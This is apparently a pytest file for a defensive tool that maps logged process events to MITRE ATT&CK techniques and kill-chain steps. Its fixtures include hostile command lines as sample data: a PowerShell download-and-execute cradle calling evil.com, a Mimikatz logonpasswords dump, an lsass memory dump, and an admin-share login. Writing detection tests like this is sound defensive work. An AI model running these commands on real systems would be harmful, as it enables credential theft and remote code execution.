"""
tests/test_attack_chain.py — Unit tests for MITRE ATT&CK mapping

Tests cover:
- PowerShell events map to T1059.001 (Execution)
- PSExec events map to T1570 (Lateral Movement)
- Mimikatz events map to T1003.001 (Credential Access)
- Kill chain steps ordered by TACTIC_ORDER
- Empty event list handling
- Affected hosts and source IPs population
"""

import pytest
import sys
import os

# Add parent directory to path to import backend module
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from backend.attack_chain import AttackChainBuilder
from backend.models import Anomaly


class TestPowerShellMapping:
    """Test PowerShell execution mapping to T1059.001."""
    
    def test_powershell_maps_to_t1059_001_execution(self):
        """
        Verify that PowerShell events are correctly mapped to
        T1059.001 (PowerShell) in the Execution tactic.
        """
        powershell_events = [
            {
                "username": "user1",
                "process_name": "powershell.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T14:30:00",
                "command_line": "powershell.exe -ExecutionPolicy Bypass",
                "hostname": "WORKSTATION-01",
            },
            {
                "username": "user1",
                "process_name": "pwsh.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T14:31:00",
                "command_line": "pwsh.exe -Command Get-Process",
                "hostname": "WORKSTATION-01",
            },
            {
                "username": "user2",
                "process_name": "cmd.exe",
                "sourceip": "10.0.1.101",
                "destinationip": None,
                "devicetime": "2026-05-28T14:32:00",
                "command_line": "cmd.exe /c powershell -EncodedCommand aQBlAHgA",
                "hostname": "WORKSTATION-02",
            },
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(powershell_events, [])
        
        # Verify chain has steps
        assert len(chain.steps) > 0, "Expected at least one kill chain step"
        
        # Find Execution tactic step
        execution_steps = [s for s in chain.steps if s.tactic == "Execution"]
        assert len(execution_steps) > 0, "Expected Execution tactic in chain"
        
        # Verify T1059.001 is present
        execution_step = execution_steps[0]
        technique_ids = [t.technique_id for t in execution_step.techniques]
        assert "T1059.001" in technique_ids, "Expected T1059.001 (PowerShell) in techniques"
        
        # Verify technique details
        powershell_tech = [t for t in execution_step.techniques if t.technique_id == "T1059.001"][0]
        assert powershell_tech.technique_name == "PowerShell"
        assert powershell_tech.tactic == "Execution"
        assert len(powershell_tech.evidence_events) > 0, "Expected evidence hosts"
    
    def test_invoke_expression_detected(self):
        """Test that Invoke-Expression pattern is detected."""
        events = [{
            "username": "attacker",
            "process_name": "powershell.exe",
            "sourceip": "10.0.1.100",
            "destinationip": None,
            "devicetime": "2026-05-28T14:30:00",
            "command_line": "powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
            "hostname": "VICTIM-01",
        }]
        
        builder = AttackChainBuilder()
        chain = builder.build(events, [])
        
        assert "T1059.001" in chain.techniques_summary, "Expected T1059.001 for Invoke-Expression"


class TestLateralMovementMapping:
    """Test lateral movement technique mapping."""
    
    def test_psexec_maps_to_t1570_lateral_movement(self):
        """
        Verify that PSExec events are correctly mapped to
        T1570 (Lateral Tool Transfer) in the Lateral Movement tactic.
        """
        psexec_events = [
            {
                "username": "admin",
                "process_name": "psexec.exe",
                "sourceip": "10.0.1.100",
                "destinationip": "10.0.2.10",
                "devicetime": "2026-05-28T15:00:00",
                "command_line": "psexec.exe \\\\SERVER-02 -u admin cmd.exe",
                "hostname": "SERVER-02",
            },
            {
                "username": "admin",
                "process_name": "paexec.exe",
                "sourceip": "10.0.1.100",
                "destinationip": "10.0.2.11",
                "devicetime": "2026-05-28T15:01:00",
                "command_line": "paexec.exe \\\\SERVER-03 cmd.exe",
                "hostname": "SERVER-03",
            },
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(psexec_events, [])
        
        # Find Lateral Movement tactic step
        lateral_steps = [s for s in chain.steps if s.tactic == "Lateral Movement"]
        assert len(lateral_steps) > 0, "Expected Lateral Movement tactic in chain"
        
        # Verify T1570 is present
        lateral_step = lateral_steps[0]
        technique_ids = [t.technique_id for t in lateral_step.techniques]
        assert "T1570" in technique_ids, "Expected T1570 (Lateral Tool Transfer) in techniques"
        
        # Verify technique details
        psexec_tech = [t for t in lateral_step.techniques if t.technique_id == "T1570"][0]
        assert psexec_tech.technique_name == "Lateral Tool Transfer"
        assert psexec_tech.tactic == "Lateral Movement"
    
    def test_smb_admin_shares_detected(self):
        """Test that SMB admin share usage is detected as T1021.002."""
        events = [{
            "username": "admin",
            "process_name": "cmd.exe",
            "sourceip": "10.0.1.100",
            "destinationip": "10.0.2.10",
            "devicetime": "2026-05-28T15:00:00",
            "command_line": "net use \\\\SERVER-02\\admin$ /user:admin password",
            "hostname": "ATTACKER-01",
        }]
        
        builder = AttackChainBuilder()
        chain = builder.build(events, [])
        
        assert "T1021.002" in chain.techniques_summary, "Expected T1021.002 for SMB admin shares"
    
    def test_winrm_detected(self):
        """Test that WinRM usage is detected as T1021.006."""
        events = [{
            "username": "admin",
            "process_name": "powershell.exe",
            "sourceip": "10.0.1.100",
            "destinationip": "10.0.2.10",
            "devicetime": "2026-05-28T15:00:00",
            "command_line": "powershell.exe New-PSSession -ComputerName SERVER-02",
            "hostname": "ATTACKER-01",
        }]
        
        builder = AttackChainBuilder()
        chain = builder.build(events, [])
        
        assert "T1021.006" in chain.techniques_summary, "Expected T1021.006 for WinRM"


class TestCredentialAccessMapping:
    """Test credential access technique mapping."""
    
    def test_mimikatz_maps_to_t1003_001_credential_access(self):
        """
        Verify that Mimikatz events are correctly mapped to
        T1003.001 (LSASS Memory) in the Credential Access tactic.
        """
        mimikatz_events = [
            {
                "username": "admin",
                "process_name": "mimikatz.exe",
                "sourceip": "10.0.1.100",
                "destinationip": "10.0.2.10",
                "devicetime": "2026-05-28T03:15:00",
                "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                "hostname": "SERVER-02",
            },
            {
                "username": "admin",
                "process_name": "procdump.exe",
                "sourceip": "10.0.1.100",
                "destinationip": "10.0.2.10",
                "devicetime": "2026-05-28T03:16:00",
                "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
                "hostname": "SERVER-02",
            },
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(mimikatz_events, [])
        
        # Find Credential Access tactic step
        cred_steps = [s for s in chain.steps if s.tactic == "Credential Access"]
        assert len(cred_steps) > 0, "Expected Credential Access tactic in chain"
        
        # Verify T1003.001 is present
        cred_step = cred_steps[0]
        technique_ids = [t.technique_id for t in cred_step.techniques]
        assert "T1003.001" in technique_ids, "Expected T1003.001 (LSASS Memory) in techniques"
        
        # Verify technique details
        lsass_tech = [t for t in cred_step.techniques if t.technique_id == "T1003.001"][0]
        assert lsass_tech.technique_name == "LSASS Memory"
        assert lsass_tech.tactic == "Credential Access"


class TestKillChainOrdering:
    """Test that kill chain steps are ordered correctly by tactic."""
    
    def test_kill_chain_ordered_by_tactic(self, sample_events):
        """
        Verify that kill chain steps are ordered according to TACTIC_ORDER:
        Execution → Persistence → Defense Evasion → Credential Access → 
        Lateral Movement → Impact
        """
        builder = AttackChainBuilder()
        chain = builder.build(sample_events, [])
        
        if len(chain.steps) < 2:
            pytest.skip("Need at least 2 steps to test ordering")
        
        # Extract tactic order from steps
        tactic_sequence = [step.tactic for step in chain.steps]
        
        # Define expected order (subset that appears in sample_events)
        # Note: Defense Evasion comes before Credential Access and Lateral Movement in TACTIC_ORDER
        expected_order = [
            "Execution",
            "Defense Evasion",
            "Credential Access",
            "Lateral Movement",
        ]
        
        # Filter to only tactics present in the chain
        present_tactics = [t for t in expected_order if t in tactic_sequence]
        
        # Verify they appear in the correct order
        for i in range(len(present_tactics) - 1):
            current_tactic = present_tactics[i]
            next_tactic = present_tactics[i + 1]
            
            current_idx = tactic_sequence.index(current_tactic)
            next_idx = tactic_sequence.index(next_tactic)
            
            assert current_idx < next_idx, (
                f"Expected {current_tactic} to come before {next_tactic} "
                f"in kill chain, but got order: {tactic_sequence}"
            )
    
    def test_step_numbers_sequential(self):
        """Verify that step numbers are sequential starting from 1."""
        events = [
            {
                "username": "user1",
                "process_name": "powershell.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T14:30:00",
                "command_line": "powershell.exe -Command Test",
                "hostname": "HOST-01",
            },
            {
                "username": "admin",
                "process_name": "psexec.exe",
                "sourceip": "10.0.1.100",
                "destinationip": "10.0.2.10",
                "devicetime": "2026-05-28T15:00:00",
                "command_line": "psexec.exe \\\\SERVER-02 cmd.exe",
                "hostname": "SERVER-02",
            },
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(events, [])
        
        step_numbers = [step.step for step in chain.steps]
        expected_numbers = list(range(1, len(chain.steps) + 1))
        
        assert step_numbers == expected_numbers, (
            f"Expected sequential step numbers {expected_numbers}, got {step_numbers}"
        )


class TestEdgeCases:
    """Test edge cases and error handling."""
    
    def test_empty_events_returns_empty_attack_chain(self):
        """Empty event list should return an AttackChain with no steps."""
        builder = AttackChainBuilder()
        chain = builder.build([], [])
        
        assert len(chain.steps) == 0, "Expected no steps for empty event list"
        assert len(chain.source_ips) == 0, "Expected no source IPs"
        assert len(chain.affected_hosts) == 0, "Expected no affected hosts"
        assert len(chain.techniques_summary) == 0, "Expected no techniques"
    
    def test_no_matching_techniques_returns_empty_chain(self):
        """Events that don't match any technique rules should return empty chain."""
        benign_events = [
            {
                "username": "user1",
                "process_name": "notepad.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T10:00:00",
                "command_line": "notepad.exe document.txt",
                "hostname": "WORKSTATION-01",
            }
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(benign_events, [])
        
        assert len(chain.steps) == 0, "Expected no steps for benign events"
        assert len(chain.techniques_summary) == 0, "Expected no techniques"


class TestMetadataPopulation:
    """Test that attack chain metadata is correctly populated."""
    
    def test_affected_hosts_and_source_ips_populated(self, sample_events):
        """
        Verify that affected_hosts and source_ips are correctly extracted
        from events and populated in the AttackChain.
        """
        builder = AttackChainBuilder()
        chain = builder.build(sample_events, [])
        
        # Verify affected_hosts is populated
        assert len(chain.affected_hosts) > 0, "Expected affected_hosts to be populated"
        
        # Check that specific hosts from sample_events are present
        expected_hosts = ["WORKSTATION-01", "SERVER-02", "SERVER-03"]
        for host in expected_hosts:
            assert host in chain.affected_hosts, f"Expected {host} in affected_hosts"
        
        # Verify source_ips is populated
        assert len(chain.source_ips) > 0, "Expected source_ips to be populated"
        
        # Check that specific IPs from sample_events are present
        # Note: Only IPs associated with matched techniques are included
        # 10.0.1.200 (scanner) doesn't match any MITRE techniques, so it won't be included
        expected_ips = ["10.0.1.100"]  # Main attacker IP
        for ip in expected_ips:
            assert ip in chain.source_ips, f"Expected {ip} in source_ips"
    
    def test_techniques_summary_populated(self, sample_events):
        """Verify that techniques_summary contains all detected technique IDs."""
        builder = AttackChainBuilder()
        chain = builder.build(sample_events, [])
        
        assert len(chain.techniques_summary) > 0, "Expected techniques_summary to be populated"
        
        # Verify it's a list of technique IDs
        for tech_id in chain.techniques_summary:
            assert tech_id.startswith("T"), f"Expected technique ID to start with 'T', got {tech_id}"
            assert "." in tech_id or len(tech_id) == 5, f"Invalid technique ID format: {tech_id}"
    
    def test_step_timestamps_populated(self):
        """Verify that each step has timestamp_first and timestamp_last."""
        events = [
            {
                "username": "user1",
                "process_name": "powershell.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T14:30:00",
                "command_line": "powershell.exe -Command Test",
                "hostname": "HOST-01",
            },
            {
                "username": "user1",
                "process_name": "powershell.exe",
                "sourceip": "10.0.1.100",
                "destinationip": None,
                "devicetime": "2026-05-28T14:35:00",
                "command_line": "powershell.exe -Command Test2",
                "hostname": "HOST-01",
            },
        ]
        
        builder = AttackChainBuilder()
        chain = builder.build(events, [])
        
        assert len(chain.steps) > 0, "Expected at least one step"
        
        for step in chain.steps:
            assert step.timestamp_first is not None, "Expected timestamp_first to be set"
            assert step.timestamp_last is not None, "Expected timestamp_last to be set"
            
            # timestamp_first should be <= timestamp_last
            assert step.timestamp_first <= step.timestamp_last, (
                f"Expected timestamp_first ({step.timestamp_first}) <= "
                f"timestamp_last ({step.timestamp_last})"
            )

# Made with Bob
